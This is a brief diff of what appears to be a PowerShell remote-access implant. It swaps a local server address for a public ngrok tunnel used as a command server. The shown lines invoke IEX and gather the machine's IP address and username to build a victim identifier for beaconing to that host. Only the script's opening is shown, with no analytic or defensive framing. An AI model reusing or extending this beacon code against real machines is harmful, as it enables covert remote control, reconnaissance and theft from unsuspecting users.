@@ -1,4 +1,4 @@
-powershell IEX $server = 'http://192.168.1.49:8080/'
+powershell IEX $server = ' https://3292-88-234-130-67.eu.ngrok.io'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
